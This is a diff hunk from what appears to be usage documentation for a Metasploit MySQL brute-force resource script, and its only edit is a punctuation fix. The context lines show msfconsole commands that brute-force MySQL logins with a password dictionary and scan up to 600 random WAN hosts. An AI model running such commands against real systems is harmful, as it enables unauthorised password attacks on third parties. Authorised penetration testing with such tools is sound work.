@@ -49,7 +49,7 @@
 
       msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'
 
-- instruct the resource script to not clean database at exit scan WAN for rhosts and limmit search to 600 rhosts
+- instruct the resource script to not clean database at exit, scan WAN for rhosts and limmit search to 600 rhosts
 
       msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/mysql_brute.rc'
 
